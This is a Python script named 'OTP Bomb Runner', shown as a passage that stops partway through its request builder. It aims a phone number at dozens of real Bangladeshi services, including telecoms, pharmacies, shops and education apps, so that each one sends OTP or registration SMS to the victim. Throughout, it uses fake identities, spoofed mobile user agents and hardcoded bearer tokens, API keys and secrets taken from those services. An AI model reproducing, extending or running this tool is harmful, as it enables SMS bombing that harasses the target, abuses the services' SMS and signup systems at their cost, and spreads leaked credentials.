#!/usr/bin/env python3
"""OTP Bomb Runner — aiohttp async (50 concurrent, ~2s/round)
   Usage: python runner.py 017XXXXXXXX 5
       or: python runner.py --server [--port 8080]
"""
import sys, os, json, random, hashlib, time, ssl, string, asyncio, threading
from urllib.parse import parse_qs, urlparse, quote as urlquote

try:
    import aiohttp
except ImportError:
    print("Install: pip install aiohttp"); sys.exit(1)

UA = ("Mozilla/5.0 (Linux; Android 11; Infinix X665B Build/RP1A.200720.011; wv) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/150.0.7871.124 Mobile Safari/537.36")
FN = ['Rahim','Karim','Sajid','Tanvir','Fahim','Arif','Mehedi','Rakib','Nayem','Jubayer','Sakib','Tamim','Rafi','Sohel','Imran']
LN = ['Hasan','Ahmed','Islam','Rahman','Hossain','Alam','Uddin','Khan','Mia','Sarker','Chowdhury','Ali','Sikder','Das','Roy']
EC = 'abcdefghijklmnopqrstuvwxyz0123456789'
PC = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%'
DM = ['gmail.com','yahoo.com','outlook.com','hotmail.com']

SSL_CTX = False
TIMEOUT = aiohttp.ClientTimeout(total=3)

def rn(): return random.choice(FN), random.choice(LN)
def re(): return f"{''.join(random.choice(EC) for _ in range(random.randint(6,10)))}@{random.choice(DM)}"
def rp(): return ''.join(random.choice(PC) for _ in range(random.randint(8,12)))

def fmt_phone(raw):
    raw = raw.strip()
    if raw.startswith('+880'): p8 = raw[1:]; pr = '0' + raw[4:]
    elif raw.startswith('0'): p8 = '880' + raw[1:]; pr = raw
    elif raw.startswith('880'): p8 = raw; pr = '0' + raw[3:]
    else: p8 = '880' + raw; pr = raw if raw.startswith('0') else '0' + raw
    return {'raw': pr, 'p880': p8, 'plus': '+' + p8, 'dash': '+88-' + pr}

async def http_get(session, url, headers=None, timeout=3):
    try:
        async with session.get(url, headers=headers or {}, timeout=aiohttp.ClientTimeout(total=timeout), ssl=SSL_CTX) as r:
            return await r.text()
    except: return ''

async def http_post(session, url, data=None, headers=None, timeout=3):
    try:
        async with session.post(url, data=data, headers=headers or {}, timeout=aiohttp.ClientTimeout(total=timeout), ssl=SSL_CTX) as r:
            return await r.text()
    except: return ''

async def preflight(session, url, extra_hdrs=None):
    h = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml'}
    if extra_hdrs: h.update(extra_hdrs)
    return await http_get(session, url, h, 3)

async def preflight_raw(session, url, extra_hdrs=None):
    h = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml', 'X-Requested-With': 'XMLHttpRequest'}
    if extra_hdrs: h.update(extra_hdrs)
    try:
        async with session.get(url, headers=h, timeout=aiohttp.ClientTimeout(total=3), ssl=SSL_CTX) as r:
            body = await r.text()
            return body, dict(r.headers)
    except: return '', {}

def build_request(api, phone):
    fN, lN = rn(); fun = f"{fN} {lN}"; em = re(); pw = rp()
    pr = phone['raw']; p8 = phone['p880']; pp = phone['plus']; pd = phone['dash']
    url = ''; body = ''; method = 'POST'
    h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA}
    try:
        if api == 'binge':
            url = 'https://api.binge.buzz/api/v4/auth/otp/send'
            body = json.dumps({"phone": pp})
            h['Origin'] = 'https://binge.buzz'
        elif api == 'admissiontaker':
            url = 'https://www.admissiontaker.site/api/send-reg-otp'
            body = json.dumps({"phone_number": pr})
        elif api == 'medico':
            url = 'https://api.v2.medico.bio/patient/passwordless-login'
            body = json.dumps({"phoneNumber": pr, "deviceId": pr, "channel": "web", "userType": "patient", "type": "newUser", "otpLength": 6})
        elif api == 'chardike':
            url = 'https://api.chardike.com/api/3f8d1e74-9a5c-4f2d-a7b1-6c8e2d91f4ab/'
            body = json.dumps({"phone": pr, "otp_type": "login", "from_request": "web"})
        elif api == 'apex4u':
            url = 'https://api.apex4u.com/api/auth/login'
            body = json.dumps({"phoneNumber": pr})
        elif api == 'ghoori':
            url = 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn'
            body = json.dumps({"mobile_no": pr})
            h['Origin'] = 'https://ghoorilearning.com'; h['Referer'] = 'https://ghoorilearning.com/'
            h['sec-ch-ua'] = '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"'
            h['sec-ch-ua-mobile'] = '?1'
        elif api == 'mygp':
            url = 'https://weblogin.grameenphone.com/backend/api/v1/otp'
            body = json.dumps({"msisdn": pr})
        elif api == 'shikho':
            url = 'https://api.shikho.com/auth/v2/send/sms'
            body = json.dumps({"phone": p8, "type": "student", "auth_type": "signup", "vendor": "shikho"})
        elif api == 'redx':
            url = 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp'
            body = json.dumps({"phoneNumber": pr})
        elif api == 'fteducation':
            url = 'https://webapp.ft.education/auth/registration'
            body = json.dumps({"name": fN, "mobile": p8, "fb_id": ""})
            h.update({'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true', 'X-Inertia-Version': '93ac2f75562c111176bdccff246ce6e7', 'Origin': 'https://webapp.ft.education'})
        elif api == 'banglalink':
            url = 'https://web-api.banglalink.net/api/v1/user/otp-login/request'
            body = json.dumps({"msisdn": pr, "secret": ""})
            h['client-security-token'] = ''; h['Origin'] = 'https://www.banglalink.net'
        elif api == 'robi':
            url = 'https://www.robi.com.bd/en/auth/login:01882873117:01788874786'
            body = json.dumps([{"msisdn": pr}])
            h = {'Content-Type': 'text/plain;charset=UTF-8', 'Accept': 'text/x-component', 'User-Agent': UA, 'Origin': 'https://www.robi.com.bd', 'next-action': '7f085f18ad8ebc8d49e2e00713b7e5568e836b5483'}
        elif api == 'bohubrihi':
            url = 'https://bb-api.bohubrihi.com/public/activity/otp'
            body = json.dumps({"phone": pr, "intent": "login"})
        elif api == 'sheba':
            url = 'https://accountkit.sheba.xyz/api/shoot-otp'
            body = json.dumps({"mobile": pp, "app_id": "8329815A6D1AE6DD", "api_token": "d1op1o9xvVPShfr2k3JNzUt4RamE84vOrYgX89bCPFKhpWuzitVVAD4uMpgM"})
        elif api == 'trucklagbe':
            url = 'https://tethys.trucklagbe.com/tl_gateway/tl_login/131/loginWithPhoneNo'
            body = json.dumps({"userType": "shipper", "phoneNo": pr})
            h['X-Bypass-Auth-Key'] = 'b6253a42-50bf-444a-8017-cd1319f4e79b-b280108f-3bdc-4ea7-964e-07e841cb5c90'
            h['deviceId'] = '103.66.168.2011784186323086'; h['source'] = 'website'
        elif api == 'osudpotro':
            url = 'https://api.osudpotro.com/api/v1/users/send_otp'
            body = json.dumps({"mobile": pd, "deviceToken": "web", "language": "en", "os": "web"})
        elif api == 'banglamed':
            url = 'https://banglamed.net/preview/home-vue/auth/send-otp'
            body = json.dumps({"phone_number": pr, "mode": "register", "redirect_url": ""})
            h['X-Requested-With'] = 'XMLHttpRequest'; h['Origin'] = 'https://banglamed.net'
        elif api == 'khaasfood':
            url = f'https://api.khaasfood.com/api/app/one-time-passwords/token?username={pr}'
            body = ''; method = 'GET'
            h = {'User-Agent': UA, 'Accept': 'application/json', 'x-requested-with': 'com.khaasfood'}
        elif api == 'cookups':
            url = 'https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n44gxxD91U6Y4C216iFzFg'
            body = json.dumps({"Action": ["GenerateOtp", {"Value_": ["BdMobileNumber", pp]}], "Constructor": ["NewFromId", {"SessionId": "c7208e9f-fd10-4ed5-98e0-2db5ea217316"}]})
            h['Origin'] = 'https://cookups.app'
        elif api == 'arogga':
            url = 'https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=149.0.7827.160&os=Android&osv=11'
            body = f"mobile={pr}&fcmToken=&referral="
            h = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Accept': '*/*', 'User-Agent': UA, 'Origin': 'https://www.arogga.com'}
        elif api == 'chaldal':
            url = f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=ae1b1e1c&phoneNumber={urlquote(pp)}&retryAttempt=0"
            body = '{}'
            h['x-egg-clientapp'] = 'Omelette'; h['x-egg-platform'] = 'Browser'; h['x-egg-storeid'] = '1'
        elif api == 'shohoz':
            url = 'https://sso-live.shohoz.com/v1.0/web/auth/sign-up/request'
            body = json.dumps({"first_name": fN, "last_name": lN, "mobile_number": pr, "email": "", "gender": 1, "recaptcha": ""})
            h['X-Requested-With'] = 'XMLHttpRequest'
        elif api == 'bengalmeat':
            url = 'https://api.bengalmeat.com/auth/otp-login'
            body = json.dumps({"phone": pr})
        elif api == 'unimart':
            dob = f"{random.randint(1,28):02d}-{random.randint(1,12):02d}-{random.randint(1995,2003)}"
            url = 'https://myadmin.unimart.online/api/v1/auth/sign-up'
            body = json.dumps({"phone": pp, "dob": dob, "gender": "Male", "email": em, "password": pw, "name": fN})
            h = {'Content-Type': 'application/json; charset=UTF-8', 'Accept': '*/*', 'User-Agent': UA, 'authorization': 'null', 'storeid': '1', 'x-localization': 'en', 'zoneid': '[1]', 'moduleid': '1', 'areaid': '1'}
        elif api == 'cholpori':
            url = 'https://www.cholpori.com/api/Auth/Register'
            body = json.dumps({"firstName": fN, "lastName": lN, "phoneNumber": pr, "role": "12"})
        elif api == 'deeptoplay':
            url = 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en'
            body = json.dumps({"number": pp}); h['Authorization'] = ''
        elif api == 'paperfly':
            url = 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php'
            body = json.dumps({"full_name": fun, "company_name": f"{fN} Corp", "email_address": em, "phone_number": pr})
            h['device_identifier'] = 'undefined'; h['device_name'] = 'undefined'
        elif api == 'aarong':
            dob = f"{random.randint(1,28):02d}-{random.randint(1,12):02d}-{random.randint(1995,2005)}"
            url = 'https://mcprod.aarong.com/graphql'
            body = json.dumps({"query": 'mutation createCustomerV2($firstname:String!,$lastname:String!,$mobile_number:String!,$email:String!,$dob:String!,$gender:Int!,$password:String!,$registered_from:String!){createCustomerV2(input:{firstname:$firstname,lastname:$lastname,mobile_number:$mobile_number,email:$email,dob:$dob,gender:$gender,password:$password,registered_from:$registered_from}){customer{firstname,lastname,email,mobile_number}}}', "variables": {"firstname": fN, "lastname": lN, "mobile_number": pr, "email": em, "dob": dob, "gender": "1", "password": pw, "registered_from": "Web"}})
            h = {'Content-Type': 'application/json', 'Accept': '*/*', 'User-Agent': UA, 'store': 'default', 'token': '', 'Origin': 'https://www.aarong.com'}
        elif api == 'esquire':
            url = 'https://api.ecommerce.esquireelectronicsltd.com/api/otp/generate-otp'
            body = json.dumps({"phoneNo": pr})
        elif api == 'htmind':
            url = 'https://api-manager.htmind.lol/v1/auth/web/send-otp'
            body = json.dumps({"phone": pr}); h['Origin'] = 'https://www.hellotask.app'
        elif api == 'kireibd':
            url = 'https://frontendapi.kireibd.com/api/v2/send-login-otp'
            body = json.dumps({"email": pr}); h['X-Requested-With'] = 'XMLHttpRequest'
        elif api == 'kabbik':
            ct = round(time.time() * 1000)
            url = 'https://api.kabbik.com/v1/auth/otpnew2'
            body = json.dumps({"msisdn": p8, "currentTimeLong": ct, "passKey": "gHxUjmKFwWPNHTGD"})
            h['authorization'] = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0.dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc'
        elif api == 'cinespot':
            url = 'https://cinespot.mobi/otp/sent'
            body = f"_token=x&mobile_number={pr}"
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://cinespot.mobi', 'Referer': 'https://cinespot.mobi/otp/sent'}
        elif api == 'edutubebd':
            url = 'https://accounts.edutubebd.com/register/verify-phone'
            body = json.dumps({"phone": pr, "token": "placeholder_token"})
            h.update({'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true', 'X-Inertia-Version': 'dc64b7f6cd379f407dccfbdc5434ffb0', 'Origin': 'https://accounts.edutubebd.com'})
        elif api == 'propertywala':
            url = 'https://propertywala.com/Handlers/AjaxHandler.ashx'
            from urllib.parse import urlencode
            body = urlencode({'task': 'authenticate', 'action': 'check', 'email': em, 'mobile': pr, 'mobileCode': '880', 'password': '', 'name': ''})
            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*', 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://propertywala.com', 'Cookie': 'locationId=20'}
        elif api == 'bengalmeat_otp':
            url = 'https://api.bengalmeat.com/auth/otp-login'
            body = json.dumps({"phone": pr})
        elif api == 'perfumeshop':
            url = 'https://perfumeshop.com.bd/wp-admin/admin-ajax.php'
            body = urlencode({'action': 'psb_send_otp', 'phone': pr, 'nonce': '8065885c28'})
            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*', 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://perfumeshop.com.bd', 'Referer': 'https://perfumeshop.com.bd/my-account/'}
            from urllib.parse import urlencode
        elif api == 'bookhouse':
            url = 'https://bookhouse.com.bd/register'
            body = urlencode({'_token': 'x', 'name': fun, 'email': em, 'mobile_no': pr, 'password': pw, 'password_confirmation': pw, 'referral_code': ''})
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://bookhouse.com.bd', 'Referer': 'https://bookhouse.com.bd/register'}
            from urllib.parse import urlencode
        elif api == 'watchzonebd':
            url = 'https://watchzonebd.com/customer/register'
            body = urlencode({'_token': 'x', 'loginDetail': '', 'name': fN, 'phone': pr, 'email': em, 'address': 'Dhaka', 'password': pw, 'password_confirmation': pw})
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://watchzonebd.com', 'Referer': 'https://watchzonebd.com/customer/register'}
            from urllib.parse import urlencode
        elif api == 'telicall':
            url = 'https://api.telicall.com/banner/phone-verification'; body = '{}'
            h.update({'x-request-id': hashlib.md5(str(time.time()).encode()).hexdigest()[:36], 'x-app-version': '1.8.0', 'x-client-device-id': '0b346f54639f3b9c', 'x-lang': 'en', 'x-os': 'android', 'x-os-version': '11', 'x-req-timestamp': str(int(time.time() * 1000)), 'x-token': 'g4rqp88VdKknaqJOmR9KiKChN-dAYFanCZOikzOWjD4lZI299dQoqiq6zhmMEp_S', 'x-req-signature': 'Ca7sS+XcB6Cr7x93ayiypkdMTJZFad4EBEqOXexwcjk='})
        elif api == 'bdjob':
            url = 'https://mybdjobs.bdjobs.com/r_OtpVerifyAcconut.asp'
            body = 'tid=1lE3l3C6767936i6XAOHnW&cat_Type=0&isTTC=false&hqs=&hIsFromFair=False&hUsernameType=mobile'
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://mybdjobs.bdjobs.com'}
        elif api == 'chorcha':
            url = 'https://mujib.chorcha.net/auth/otp'
            body = json.dumps({"phone": pr, "otp": f"{random.randint(0,999999):06d}"})
            h = {'authorization': 'Bearer undefined', 'app': 'true', 'x-pkg': 'com.chorcha.ai', 'x-pltfm': 'android', 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json'}
        elif api == 'epharma':
            url = 'https://epharma.com.bd/authentication/send-otp'
            body = f"number=%2B{p8}&recaptcha_token=placeholder"
            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*', 'User-Agent': UA, 'Origin': 'https://epharma.com.bd', 'X-Requested-With': 'XMLHttpRequest'}
        elif api == 'jachail':
            url = 'https://auth.jachai.com/api/v1/otp/send-register-otp'
            body = json.dumps({"countryCode": "BD", "mobileNumber": pp, "mobileNumberOrEmail": pp, "userType": "USER"})
            h = {'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'mobile-android', 'devicename': 'Infinix_Infinix X665B', 'devicetype': 'ANDROID', 'deviceid': 'Infinix-X665B-e1f7baf3770aaa82', 'appversion': '2.1.61'}
        elif api == 'pbazaar':
            url = f'https://www.pbazaar.com/en/Registration/MobileNumber?ResultCode=0&MobileNumber={pr}&send-code=Send+Code'
            body = ''; method = 'GET'; h = {'User-Agent': UA, 'Accept': 'text/html'}
        elif api == 'iscreen':
            url = 'https://api.rockstreamer.com/otp/api/v1/phone/otp'
            body = json.dumps({"phone_number": pp})
            h['authorization'] = 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE5NzIzMzg1IiwicHJvdmlkZXJfaWQiOiIxNzg0MjM3MTgyNDE2LUwwb3MzTVMzZDFWTmtrQVNDT1BqMUE3NmV2T1RUMEQ3NDRJR1ZWMzVmSUc3Z093aERGY2ZQQXN0NWQ2Wjk0bW8iLCJyb2xlIjo0LCJ1c2VybmFtZSI6Im5tOVhSdSIsInBsYXRmb3JtIjoiaXNjcmVlbiIsInBhcnRuZXIiOm51bGwsInN1YnNjcmliZSI6ZmFsc2UsInBhY2thZ2VJbmZvIjpudWxsLCJpc1RWT0QiOmZhbHNlLCJ0dm9kRXhwaXJlRGF0ZSI6IjE5NzAtMDEtMDEiLCJpYXQiOjE3ODQyMzcxODIsImV4cCI6MTc4NDMyMzU4Mn0.kIMtAvc0kfQpUZxaLknKo7BKUtTHC7TE126hPMoQ6wSXbk5npbcEBJbT94_MYVAD997-D4DtWQmFDur8MD4ILz6ZAeagyfOjNQ7_KEQhQQQkM3CHbreEgzc9SohqoFOTGt_VpBa3OAS0Ph8WDAPfNLtlO8zoUGx0CaqLDRZtXecHzwqsF83icXiveSECemAJmXeKCr074CRUSWAsUMAeXSjT4LVGN9unjk5cx6soWha6NG_nz9n-TL0wf64wnwwzv1cwtMPI8hoYF89KXb0VdgdNH_5ryhj09jGDZahNjtw5d99vcm-RCiT1NUed9Kd3LeexEz85g1o7Yb4oqHTxdUb6NMTOAHAZwPez6_ow8OC632KuEYrwedz2J9mj7gDnuw_H-J8mJnUZFD-kPiH78G98Dc9VvtBKonCvGJbFscOPzbO-AzUOjJp9arjY95rM_PXAG_USRTHvxWTssoX_WhcPSazAxcFr25BTWRQltwesAHceWfAOCc7th4sVC93Fwo3bEkzVv3SN-bXGDoAn4dw_seRlvT8XzTLKiTTLRgmTIN7FAVE0VMecGG7eFkLooze5I8vRyqDQM6CKaZJl56RXQ6MpBqkWBc3gdSlnO522wYqPaQ_6Q-194r2W1Ig9hhDiFJOQbJ-jbPyDgtkXnPtrODemyuO-YIcYo41LmAM'
        elif api == 'rabbithole':
            ct = int(time.time())
            hs = hashlib.sha256(f"{ct}rabbithole_secret".encode()).hexdigest()
            url = 'https://apix.rabbitholebd.com/appv2/login/requestOTP'
            body = json.dumps({"mobile": pp}); h['current-time'] = str(ct); h['hash'] = hs
        elif api == 'medeasy':
            url = f'https://api.medeasy.health/api/send-otp/{pp}/'
            body = ''; method = 'GET'; h['Origin'] = 'https://medeasy.health'
        elif api == 'jatri':
            url = 'https://api.retail.jatri.co/auth/api/v1/send-otp'
            body = json.dumps({"phone": pr, "purpose": "USER_LOGIN", "deviceType": "WEB", "cloudFlareToken": "placeholder"})
            h['token'] = 'cSkjXjjg3LC3KudSPgt2V9gjKK0thNW5Gk26nhHJpgQr2FtjDtgptCNLSnneTG0t'
            h['x-os'] = 'Android'; h['x-browser'] = 'Chrome'; h['x-browser-version'] = '150'; h['x-device-type'] = 'Mobile'
        elif api == 'shajgoj':
            url = 'https://bk.shajgoj.com/api/customers/send-otp'
            body = json.dumps({"phone": pr, "altcha": "placeholder"})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': UA, 'Origin': 'https://bk.shajgoj.com'}
        elif api == 'walifier':
            url = 'https://mobile.wafilife.com/api/mobile/send-otp'; body = json.dumps({"mobile": pp})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': UA, 'Origin': 'https://mobile.wafilife.com'}
        elif api == 'iqralive':
            url = f'https://apibeta.iqra-live.com/api/v2/sent-otp/{pr}'; body = ''; method = 'GET'
        elif api == 'quizgiri':
            ts = str(int(time.time()))
            dg = hashlib.sha256(f"quizgiri_salt{ts}".encode()).hexdigest()
            url = 'https://developer.quizgiri.xyz/api/v2.0/send-otp'
            body = json.dumps({"country_code": "+88", "phone": pr, "timestamp": ts, "digest": dg})
            h['Authorization'] = 'Bearer'
        elif api == 'ghorerbazar':
            url = 'https://back-office.ghorerbazarbd.com/api/register-with-otp'
            body = json.dumps({"name": fun, "username": pr, "address": "Dhaka"})
            h = {'Content-Type': 'application/json', 'User-Agent': 'Dart/3.9', 'authorization': 'GenericCommerceV1-SBW7583837NUDD82'}
        elif api == 'pathao':
            url = 'https://api.pathao.com/v2/auth/register'
            body = json.dumps({"country_prefix": "880", "national_number": pr[1:], "country_id": 1})
            h = {'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'okhttp/5.1.0', 'App-Agent': 'ride/android/537', 'Android-OS': '11'}
        elif api == 'garibook':
            url = 'https://api.garibookadmin.com/api/v4/user/login'
            body = json.dumps({"mobile": pp, "gb_code": "IKiyBy55yYkaF8U"})
            h = {'Content-Type': 'application/json', 'User-Agent': 'Dart/3.12 (dart:io)', 'Accept': 'application/json', 'authorization': 'Bearer', 'x-requested-with': 'XMLHttpRequest'}
        elif api == 'shadhin':
            url = 'https://connect.shadhinmusic.com/v1/api/otp/send'
            body = json.dumps({"action": "Forget", "msisdn": p8, "serviceName": "Shadhin Music", "user": "sh@dHinOTP"})
            h = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'ShadhinMusic v4.4.2'}
        elif api == 'suzuki':
            url = 'https://suzuki.com.bd/signup'
            body = json.dumps([{"firstName": fN, "lastName": lN, "countryCode": "BD", "phone": pr, "email": em, "password": pw, "confirmPassword": pw, "otp": ""}, "initial"])
            h = {'Content-Type': 'text/plain;charset=UTF-8', 'Accept': 'text/x-component', 'User-Agent': UA, 'Origin': 'https://suzuki.com.bd', 'Next-Action': 'b45aa2700649f9fa8fb8befec1519c7f2b4c2192'}
        elif api == 'biddabari':
            url = 'https://biddabari.com/user-register'
            body = f"_token=x&name={urlquote(fun)}&mobile={pr}&password={pw}&password_confirmation={pw}"
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://biddabari.com', 'Referer': 'https://biddabari.com/register-page'}
        elif api == 'karobar':
            url = 'https://mybackend.karobarapp.com/api/v3/oauth/otp-request/'
            body = json.dumps({"phone_number": pr, "country": "bd"})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'Origin': 'https://my.karbarapp.com', 'Referer': 'https://my.karbarapp.com/'}
        elif api == 'packly':
            url = 'https://admin.shop.packly.com/api/v1/ecommerce/send-otp'; body = json.dumps({"phone": pr})
            h = {'Content-Type': 'application/json', 'Accept': '*/*', 'User-Agent': UA, 'Origin': 'https://www.packly.com', 'X-Platform': 'web', 'X-App-Version': '1.0.0', 'X-Build-Number': '1.0.0'}
        elif api == 'carrybee_verify':
            url = f'https://merchant.carrybee.com/register/verification/{p8}?otpPrefix=WFA'; body = ''; method = 'GET'
            h = {'User-Agent': UA, 'Accept': '*/*', 'Referer': 'https://merchant.carrybee.com/register'}
        elif api == 'carrybee_register':
            url = 'https://api-merchant.carrybee.com/api/v2/merchant/register'
            body = json.dumps({"name": fN, "phone_number": pp, "business_name": f"{fN} Business"})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': UA, 'Origin': 'https://merchant.carrybee.com', 'Referer': 'https://merchant.carrybee.com/'}
        elif api == 'eziclick':
            url = 'https://eziclick.com/web-api/api/register/check-phone'; body = json.dumps({"phone": pr})
            h = {'Content-Type': 'application/json', 'Accept': '*/*', 'User-Agent': UA, 'Origin': 'https://eziclick.com', 'Referer': 'https://eziclick.com/shop?login=1'}
        elif api == 'livemcq':
            url = 'https://livemcq.com/web-otp-send/'; body = f"phone_number={pr}"
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*', 'User-Agent': UA, 'Origin': 'https://livemcq.com', 'Referer': 'https://livemcq.com/login/', 'X-CSRFToken': 'x', 'X-Requested-With': 'XMLHttpRequest'}
        elif api == 'timezonebd':
            url = 'https://backend.timezonebd.com/api/v1/user/otp-login'; body = json.dumps({"phone": pr})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'Origin': 'https://timezonebd.com', 'Referer': 'https://timezonebd.com/', 'Authorization': ''}
        elif api == 'shaddho':
            url = 'https://shaddho.com.bd/register'
            body = f"_token=x&name={urlquote(fun)}&phone={pr}&country_code=88&email={em}&password={pw}&password_confirmation={pw}&checkbox_example_1=on"
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://shaddho.com.bd', 'Referer': 'https://shaddho.com.bd/users/registration'}
        elif api == 'amarbay':
            url = 'https://backend.amarbay.com/user/find_user_by_phone/'; body = json.dumps({"phone_number": pr})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'Origin': 'https://amarbay.com', 'Referer': 'https://amarbay.com/'}
        elif api == 'rhombus':
            url = 'https://www.rhombuspublications.com/api/auth/exists'; body = json.dumps({"cred": pr})
            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'User-Agent': 'Dart/3.10 (dart:io)'}
        elif api == 'toffee':
            url = 'https://prod-services.toffeelive.com/sms/v1/subscriber/otp'
            body = json.dumps({"target": p8, "resend": False})
            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'User-Agent': 'okhttp/5.1.0', 'x-app-version': '9.2.4', 'x-app-platform': 'android-mobile', 'authorization': 'Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL3RvZmZlZWxpdmUuY29tIiwiY291bnRyeSI6IkJEIiwiZF9pZCI6IjY3N2FmMGJjLWRlZDYtNGRlNi1hNjhlLTI5NjViYzU5YmUxMyIsImV4cCI6MTc4ODI2MTgyMywiaWF0IjoxNzg1NjMyMDIzLCJpc3MiOiJ0b2ZmZWVsaXZlLmNvbSIsImp0aSI6ImFiNDMwMGE4LWZmZjAtNDVkNi04YmY0LWZiY25lYzI1MDlkMl8xNzg1NjMyMDIzIiwicHJvdmlkZXIiOiJ0b2ZmZWUiLCJyX2lkIjoiNjc3YWYwYgmtZGVkNi00ZGU2LWE2OGUtNjk2NWJjNTliZTEzIiwic19pZCI6IjY3N2FmMGJjLWRlZTYtNGRlNi1hNjhlLTHyMDFiYzU5YmUxMyIsInRva2VuIjoiYWNjZXNzIiwidHlwZSI6ImRldmljZSJ9.37ICp67-KrJ5_vX3xrD2Opv2N7AyVlpx8wrjC-lSSCVFABEASTDYoLKvCEtGDKSaiAykD2kpPVaUVBwh28UG_g'}
        elif api == 'apcom':
            url = 'https://apcombd.com/api/v2/auth/password/forget_request'
            body = json.dumps({"email_or_phone": pp, "send_code_by": "phone"})
            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'User-Agent': 'Dart/3.4 (dart:io)', 'authorization': 'Bearer null'}
        elif api == 'ieducation':
            url = 'https://www.ieducationbd.com/v1/api/account/register'
            body = f"mobile={pr}&username={''.join(random.choice(string.ascii_lowercase) for _ in range(13))}"
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json', 'User-Agent': 'Dart/3.5 (dart:io)'}
        elif api == 'brritto':
            url = 'https://api.brritto.com/api/v1/auth/send-otp'; body = json.dumps({"mobileNumber": pr})
            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'User-Agent': 'Dart/3.5 (dart:io)'}
        elif api == 'edgecourse':
            url = 'https://api.edgecoursebd.com/api/auth/temporary-register/'; body = json.dumps({"phone": pr})
            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Dart/3.5 (dart:io)'}
        elif api == 'shopbase':
            url = 'https://shopbasebd.com/store/registration/sendOTP'
            body = f'number={pr}&_token=1jXdRS2D9yaoOn7MbQGBb2IDVImUetZLA8dYBTEP'
            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*', 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://shopbasebd.com', 'Referer': 'https://shopbasebd.com/store/registration/otp'}
        elif api == 'jamakapor':
            url = 'https://www.jamakapor.com.bd/api/v1/auth/check-phone'
            body = json.dumps({"phone": pp, "temporary_token": "PMD2mz3AYM1mOx7hwmGCLVnNDx8Gvf9Pv8geN12L"})
            h = {'Content-Type': 'application/json; charset=UTF-8', 'Accept': 'application/json', 'User-Agent': 'Dart/3.5 (dart:io)'}
        elif api == 'quizbd':
            ts = str(int(time.time())); dg = hashlib.sha256(f"quizbd_salt{ts}".encode()).hexdigest()
            url = 'https://developer.quizbd.app/api/v2.0/send-otp'
            body = json.dumps({"country_code": "+88", "phone": pr, "timestamp": ts, "digest": dg})
            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'User-Agent': 'Dart/3.5 (dart:io)'}
        elif api == 'shukhee':
            url = 'https://notifyv2.shukhee.com/api/shoot-otp/mobile'
            body = json.dumps({"app_id": "shukheeOTP2025", "api_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3ODU2OTY3NDYsImV4cCI6MTc4NjI5Njc0Nn0.test", "mobile": pp})
